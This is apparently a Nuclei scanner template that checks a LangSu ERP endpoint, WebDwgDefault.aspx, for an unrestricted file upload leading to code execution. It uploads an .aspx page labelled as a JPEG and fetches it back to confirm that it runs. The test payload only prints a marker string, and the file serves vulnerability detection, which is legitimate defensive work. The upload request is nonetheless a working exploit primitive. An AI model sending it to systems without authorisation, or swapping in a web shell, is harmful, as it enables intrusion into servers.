id: LangSuERP-WebDwgDefault-UploadToRce

info:
  name: LangSuERP-WebDwgDefault-UploadToRce
  author: iSee857
  severity: critical
  description: LangSuERP-WebDwgDefault-UploadToRce

http:
  - raw:
      - |
        POST /WebDwgDefault.aspx?IsSave=true&FileName=12345.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6cF2ujf5U1u9055I
        Accept: */*
        Connection: close

        ------WebKitFormBoundary6cF2ujf5U1u9055I
        Content-Disposition: form-data; name="file"; filename="1.aspx"
        Content-Type: image/jpeg

        <%@ Page Language="Jscript" validateRequest="false" %>
        <% Response.Write("helloWorld")%>
        ------WebKitFormBoundary6cF2ujf5U1u9055I--
      - |
        GET /12345.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "helloWorld"
        condition: and